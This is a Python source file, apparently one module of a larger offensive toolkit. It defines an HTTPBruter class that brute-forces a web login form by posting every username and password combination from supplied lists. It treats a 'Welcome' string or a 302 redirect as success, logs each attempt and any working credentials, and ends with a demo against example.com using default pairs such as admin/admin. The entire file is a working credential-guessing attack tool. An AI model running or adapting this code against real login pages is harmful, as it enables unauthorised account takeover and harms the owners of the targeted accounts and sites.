import requests
from core.logger import log_event

class HTTPBruter:
    def __init__(self, url, usernames, passwords):
        self.url = url
        self.usernames = usernames
        self.passwords = passwords
        self.found = []

    def try_login(self, username, password):
        data = {"username": username, "password": password}
        try:
            response = requests.post(self.url, data=data, timeout=5)
            if "Welcome" in response.text or response.status_code == 302:
                return True
        except:
            return False
        return False

    def run(self):
        for user in self.usernames:
            for pwd in self.passwords:
                log_event("http_brute_try", {"username": user, "password": pwd})
                if self.try_login(user, pwd):
                    result = {"user": user, "pass": pwd}
                    log_event("http_brute_success", result, level="info")
                    self.found.append(result)
                    return self.found
        return self.found

if __name__ == "__main__":
    usernames = ["admin", "guest"]
    passwords = ["admin", "guest123"]
    bruter = HTTPBruter("http://example.com/login", usernames, passwords)
    print(bruter.run())
